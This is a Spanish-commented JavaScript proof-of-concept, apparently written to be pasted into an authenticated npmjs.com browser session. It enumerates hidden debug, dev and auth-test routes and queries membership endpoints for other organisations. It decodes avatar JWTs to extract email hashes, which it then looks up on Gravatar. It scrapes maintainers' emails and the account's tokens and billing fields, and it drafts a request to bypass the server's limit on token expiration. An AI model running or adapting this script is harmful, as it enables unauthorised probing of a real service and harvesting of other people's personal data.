// ================================================================
// PoC v4: Pruebas enfocadas en rutas internas descubiertas
//
// Las rutas debug/, dev/, egg/, dsr/, vouchers/ son interesantes
// También probar acceso a datos propios vía API spiferack
//
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

const csrftoken = window.__context__?.context?.csrftoken;
const username = window.__context__?.context?.user?.name;
const manifestHash = window.__context__?.hash || '';
const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': manifestHash
};

console.log("=== PoC v4: Rutas Internas y APIs ===");
console.log("[*] Usuario:", username);
console.log("");


// ================================================================
// TEST 1: Rutas debug/dev internas
// ================================================================

console.log("=== TEST 1: Rutas Debug/Dev/Internas ===");
(async () => {
    const debugRoutes = [
        '/debug/badstatus',
        '/debug/detail',
        '/debug/failcomponent',
        '/dev/choose-template',
        '/egg',
        '/dsr/dsr-export',
        '/vouchers/view',
        '/acceptance/acceptance',
        '/-/debug',
        '/-/health',
        '/-/status',
        '/-/ping',
        '/-/whoami',
        '/-/npm/v1/user',
        '/-/npm/v1/tokens',
    ];

    for (const route of debugRoutes) {
        try {
            const res = await fetch(route, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            const status = res.status;
            const contentType = res.headers.get('content-type') || '';

            if (status === 200) {
                if (contentType.includes('json')) {
                    const data = await res.json();
                    console.log(`[!!!] ${route} → HTTP 200 JSON`);
                    console.log(`    Keys: ${Object.keys(data).join(', ')}`);
                    console.log(`    Data: ${JSON.stringify(data).substring(0, 500)}`);
                } else {
                    const text = await res.text();
                    console.log(`[+] ${route} → HTTP 200 (${contentType}, ${text.length} bytes)`);
                    if (text.length < 500) console.log(`    Content: ${text.substring(0, 300)}`);
                }
            } else if (status !== 404) {
                console.log(`[*] ${route} → HTTP ${status} (${res.statusText})`);
            } else {
                console.log(`[-] ${route} → 404`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 2: API del registry npm (sin autenticación web)
// ================================================================

console.log("\n=== TEST 2: Registry API endpoints ===");
(async () => {
    const registryEndpoints = [
        // Registry API público
        { url: 'https://registry.npmjs.org/-/v1/search?text=scope:originmap&size=50', desc: 'Buscar paquetes del scope @originmap' },
        { url: 'https://registry.npmjs.org/@originmap/no-scan', desc: 'Metadata de @originmap/no-scan' },
        { url: 'https://registry.npmjs.org/-/org/originmap/user', desc: 'Usuarios de org originmap' },
        { url: 'https://registry.npmjs.org/-/org/originmap/package', desc: 'Paquetes de org originmap' },
        { url: 'https://registry.npmjs.org/-/org/openvite/user', desc: 'Usuarios de org openvite' },
        { url: 'https://registry.npmjs.org/-/user/org.couchdb.user:andrysilva', desc: 'Datos del usuario andrysilva' },
        // Intentar con orgs grandes
        { url: 'https://registry.npmjs.org/-/org/vercel/user', desc: 'Usuarios de org vercel' },
        { url: 'https://registry.npmjs.org/-/org/babel/user', desc: 'Usuarios de org babel' },
        { url: 'https://registry.npmjs.org/-/org/types/user', desc: 'Usuarios de org @types' },
    ];

    for (const ep of registryEndpoints) {
        try {
            const res = await fetch(ep.url);
            const status = res.status;

            if (status === 200) {
                const data = await res.json();
                console.log(`[!!!] ${ep.desc} → HTTP 200`);
                if (typeof data === 'object' && !Array.isArray(data)) {
                    const keys = Object.keys(data);
                    if (keys.length <= 20) {
                        console.log(`    Datos: ${JSON.stringify(data).substring(0, 500)}`);
                    } else {
                        console.log(`    ${keys.length} keys - primeras 10: ${keys.slice(0, 10).join(', ')}`);
                    }
                } else {
                    console.log(`    Datos: ${JSON.stringify(data).substring(0, 500)}`);
                }
            } else if (status === 401) {
                console.log(`[*] ${ep.desc} → 401 (requiere auth token)`);
            } else if (status === 403) {
                console.log(`[*] ${ep.desc} → 403 (prohibido)`);
            } else {
                console.log(`[-] ${ep.desc} → HTTP ${status}`);
            }
        } catch(e) {
            console.log(`[-] ${ep.desc} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 3: Decodificar los JWT de los avatares
// ================================================================

console.log("\n=== TEST 3: JWT en Avatar URLs ===");
(() => {
    const ctx = window.__context__?.context;
    const avatarUrl = ctx?.user?.avatars?.small;

    if (!avatarUrl) {
        console.log("[-] No hay avatar URL");
        return;
    }

    // Extraer JWT del path
    const jwtMatch = avatarUrl.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (jwtMatch) {
        const jwt = jwtMatch[0];
        const parts = jwt.split('.');

        try {
            const header = JSON.parse(atob(parts[0]));
            const payload = JSON.parse(atob(parts[1]));

            console.log("[+] JWT encontrado en avatar URL:");
            console.log("    Header:", JSON.stringify(header));
            console.log("    Payload:", JSON.stringify(payload));
            console.log("    Algoritmo:", header.alg);

            if (payload.avatarURL) {
                console.log("[+] Gravatar URL real:", payload.avatarURL);
                // Extraer hash de email de Gravatar
                const gravatarMatch = payload.avatarURL.match(/avatar\/([a-f0-9]+)/);
                if (gravatarMatch) {
                    console.log("[+] Hash MD5 del email (Gravatar):", gravatarMatch[1]);
                    console.log("[*] Este hash se puede usar para lookup reverso del email");
                }
            }
        } catch(e) {
            console.log("[-] Error decodificando JWT:", e.message);
        }
    }
})();


// ================================================================
// TEST 4: Probar DSR Export (Data Subject Request - GDPR)
// ================================================================

console.log("\n=== TEST 4: DSR Export (GDPR Data Export) ===");
(async () => {
    // Probar la ruta de exportación de datos
    const drsRoutes = [
        `/settings/${username}/dsr`,
        `/settings/${username}/dsr/export`,
        `/dsr/dsr-export`,
        `/-/npm/v1/user/${username}`,
    ];

    for (const route of drsRoutes) {
        try {
            const res = await fetch(route, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            if (res.status === 200) {
                const contentType = res.headers.get('content-type') || '';
                if (contentType.includes('json')) {
                    const data = await res.json();
                    console.log(`[!!!] ${route} → HTTP 200 JSON`);
                    console.log(`    Keys: ${Object.keys(data).join(', ')}`);
                    console.log(`    Data: ${JSON.stringify(data).substring(0, 1000)}`);
                } else {
                    const text = await res.text();
                    console.log(`[+] ${route} → HTTP 200 (${text.length} bytes)`);
                }
            } else {
                console.log(`[-] ${route} → HTTP ${res.status}`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 5: Probar acceso a settings propios via Spiferack JSON
// Extraer la máxima cantidad de datos de TU propia cuenta
// ================================================================

console.log("\n=== TEST 5: Extraer TODOS tus datos via Spiferack ===");
(async () => {
    const myRoutes = [
        `/settings/${username}/profile`,
        `/settings/${username}/email`,
        `/settings/${username}/tokens`,
        `/settings/${username}/packages`,
        `/~${username}`,
        `/settings/${username}/billing`,
    ];

    for (const route of myRoutes) {
        try {
            const res = await fetch(route, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            if (res.status === 200) {
                const contentType = res.headers.get('content-type') || '';
                if (contentType.includes('json')) {
                    const data = await res.json();
                    const keys = Object.keys(data);
                    console.log(`\n[+] ${route} → ${keys.length} keys`);

                    // Buscar datos sensibles
                    for (const key of keys) {
                        const val = data[key];
                        const valStr = JSON.stringify(val);

                        if (key.toLowerCase().includes('email')) {
                            console.log(`    [!!!] ${key}: ${valStr.substring(0, 200)}`);
                        } else if (key.toLowerCase().includes('token')) {
                            console.log(`    [!!!] ${key}: ${valStr.substring(0, 200)}`);
                        } else if (key.toLowerCase().includes('password') || key.toLowerCase().includes('secret')) {
                            console.log(`    [!!!] ${key}: ${valStr.substring(0, 200)}`);
                        } else if (key.toLowerCase().includes('billing') || key.toLowerCase().includes('stripe') || key.toLowerCase().includes('payment')) {
                            console.log(`    [!!!] ${key}: ${valStr.substring(0, 200)}`);
                        } else if (key === 'user' || key === 'profile' || key === 'account') {
                            console.log(`    [+] ${key}: ${valStr.substring(0, 300)}`);
                        } else if (key === 'packages' || key === 'tokens') {
                            console.log(`    [+] ${key}: ${typeof val === 'object' ? (Array.isArray(val) ? val.length + ' items' : Object.keys(val).length + ' keys') : valStr.substring(0, 100)}`);
                        } else if (valStr.length > 2) {
                            console.log(`    ${key}: ${valStr.substring(0, 150)}${valStr.length > 150 ? '...' : ''}`);
                        }
                    }
                }
            } else {
                console.log(`[-] ${route} → HTTP ${res.status}`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 6: Probar página de test de auth (descubiertas en rutas)
// auth/test/email-otp-test, escalate-test, otp-test, webauthn-login-test
// ================================================================

console.log("\n=== TEST 6: Páginas de Test de Auth ===");
(async () => {
    const testPages = [
        '/auth/test/email-otp-test',
        '/auth/test/escalate-test',
        '/auth/test/otp-test',
        '/auth/test/webauthn-login-test',
        '/errors/tea-pot',  // Easter egg?
    ];

    for (const page of testPages) {
        try {
            const res = await fetch(page, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            if (res.status === 200) {
                const contentType = res.headers.get('content-type') || '';
                if (contentType.includes('json')) {
                    const data = await res.json();
                    console.log(`[!!!] ${page} → HTTP 200 JSON`);
                    console.log(`    Keys: ${Object.keys(data).join(', ')}`);
                    console.log(`    Data: ${JSON.stringify(data).substring(0, 500)}`);
                } else {
                    const text = await res.text();
                    console.log(`[+] ${page} → HTTP 200 (${text.length} bytes)`);
                    // Buscar datos interesantes en el HTML
                    if (text.includes('csrftoken')) console.log("    [+] Contiene csrftoken");
                    if (text.includes('__context__')) console.log("    [+] Contiene __context__");
                }
            } else if (res.status === 418) {
                console.log(`[+] ${page} → HTTP 418 I'm a Teapot! (Easter egg confirmado)`);
            } else {
                console.log(`[-] ${page} → HTTP ${res.status}`);
            }
        } catch(e) {
            console.log(`[-] ${page} → Error: ${e.message}`);
        }
    }
})();


// ================================================================
// TEST 7: Manipulación de tokens - crear token con permisos max
// (Solo lectura - NO ejecuta la creación, solo muestra los datos)
// ================================================================

console.log("\n=== TEST 7: Payload para token con permisos máximos ===");
(() => {
    // Esto es lo que se enviaría para crear un token con TODOS los permisos
    // NO se ejecuta, solo se muestra para análisis
    const maxTokenPayload = {
        csrftoken: csrftoken,
        tokenName: "test-max-perms",
        tokenDescription: "Security test",
        expirationDays: "365",  // Máximo posible? El flag limita a 90 para read-write
        allowedIPRanges: ["0.0.0.0/0"],  // Todas las IPs
        packagesAndScopesPermission: "Read and write",
        selectedPackages: [],  // Vacío = ¿todos?
        selectedScopes: [],
        orgsPermission: "Read and write",
        selectedOrgs: [],  // Vacío = ¿todos?
    };

    console.log("[*] Payload que se enviaría para token de máximos permisos:");
    console.log(JSON.stringify(maxTokenPayload, null, 2));
    console.log("");
    console.log("[*] NOTA: La validación client-side limita read-write a 90 días");
    console.log("[*] PERO si enviamos el POST directamente al server con 365 días...");
    console.log("[*] ¿El servidor valida ese límite también?");
    console.log("");
    console.log("[*] Endpoint: POST " + (window.__context__?.context?.createTokenURL || '/settings/{user}/tokens/new-gat'));
    console.log("[*] Para probar bypass de validación client-side:");
    console.log(`
    // CUIDADO: Esto CREARÍA un token real en tu cuenta
    // Solo ejecutar si quieres probar
    /*
    fetch('${window.__context__?.context?.createTokenURL || '/settings/' + username + '/tokens/new-gat'}', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'x-csrf-token': '${csrftoken}',
            'content-type': 'application/json',
            'accept': 'application/json',
        },
        body: JSON.stringify({
            csrftoken: '${csrftoken}',
            tokenName: 'security-test-365d',
            tokenDescription: 'Testing expiration bypass',
            expirationDays: '365',
            allowedIPRanges: ['0.0.0.0/0'],
            packagesAndScopesPermission: 'Read and write',
            selectedPackages: [],
            selectedScopes: [],
            orgsPermission: 'Read and write',
            selectedOrgs: [],
        })
    }).then(r => r.json()).then(d => {
        console.log("Respuesta:", d);
        if (d.token) console.log("[!!!] TOKEN CREADO CON 365 DÍAS (bypass confirmado)");
    });
    */
    `);
})();


// ================================================================
// TEST 8: Probar API de Gravatar con el hash del email
// ================================================================

console.log("\n=== TEST 8: Lookup de Email via Gravatar Hash ===");
(async () => {
    const ctx = window.__context__?.context;
    const avatarUrl = ctx?.user?.avatars?.small;

    if (!avatarUrl) return;

    const jwtMatch = avatarUrl.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
    if (!jwtMatch) return;

    try {
        const payload = JSON.parse(atob(jwtMatch[0].split('.')[1]));
        const gravatarMatch = payload.avatarURL?.match(/avatar\/([a-f0-9]+)/);

        if (gravatarMatch) {
            const hash = gravatarMatch[1];
            console.log(`[+] Hash MD5 del email: ${hash}`);

            // Gravatar JSON API
            try {
                const res = await fetch(`https://en.gravatar.com/${hash}.json`);
                if (res.ok) {
                    const data = await res.json();
                    console.log("[!!!] PERFIL GRAVATAR ENCONTRADO:");
                    console.log("    Datos:", JSON.stringify(data).substring(0, 500));
                    if (data.entry?.[0]?.emails) {
                        console.log("[!!!] EMAILS:", JSON.stringify(data.entry[0].emails));
                    }
                    if (data.entry?.[0]?.displayName) {
                        console.log("[+] Nombre:", data.entry[0].displayName);
                    }
                } else {
                    console.log(`[-] Gravatar API: HTTP ${res.status}`);
                }
            } catch(e) {
                console.log(`[-] Gravatar API bloqueada por CORS (probar en curl):`);
                console.log(`    curl https://en.gravatar.com/${hash}.json`);
            }
        }
    } catch(e) {
        console.log("[-] Error:", e.message);
    }
})();


// ================================================================
// TEST 9: Verificar qué datos se exponen en la página de OTRO paquete
// (paquetes públicos - ver si leak data del owner)
// ================================================================

console.log("\n=== TEST 9: Datos del Owner en Páginas de Paquetes ===");
(async () => {
    // Acceder a un paquete popular y ver qué datos del maintainer se exponen
    const packages = ['express', 'lodash', 'react'];

    for (const pkg of packages) {
        try {
            const res = await fetch(`/package/${pkg}`, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            if (res.ok) {
                const data = await res.json();
                console.log(`\n[+] /package/${pkg}:`);

                // Buscar datos de maintainers
                if (data.packument?.maintainers) {
                    console.log(`    Maintainers:`);
                    data.packument.maintainers.forEach(m => {
                        console.log(`      - ${m.name} ${m.email ? '| email: ' + m.email : ''}`);
                    });
                }
                if (data.packageVersion?.maintainers) {
                    console.log(`    Version maintainers:`);
                    data.packageVersion.maintainers.forEach(m => {
                        console.log(`      - ${m.name} ${m.email ? '| email: ' + m.email : ''}`);
                    });
                }
                // Buscar emails en cualquier parte
                const dataStr = JSON.stringify(data);
                const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                const emails = [...new Set(dataStr.match(emailRegex) || [])];
                if (emails.length > 0) {
                    console.log(`    [!!!] Emails encontrados: ${emails.join(', ')}`);
                }
            }
        } catch(e) {
            console.log(`[-] Error: ${e.message}`);
        }
    }
})();


console.log("\n\n=== FIN PoC v4 ===");
console.log("Los resultados más importantes son:");
console.log("  TEST 1: ¿Alguna ruta debug/dev accesible?");
console.log("  TEST 2: ¿Registry API devuelve datos de orgs?");
console.log("  TEST 3: JWT en avatares decodificado");
console.log("  TEST 5: Todos tus datos personales via Spiferack");
console.log("  TEST 6: ¿Páginas de test de auth accesibles?");
console.log("  TEST 9: ¿Se filtran emails de maintainers?");
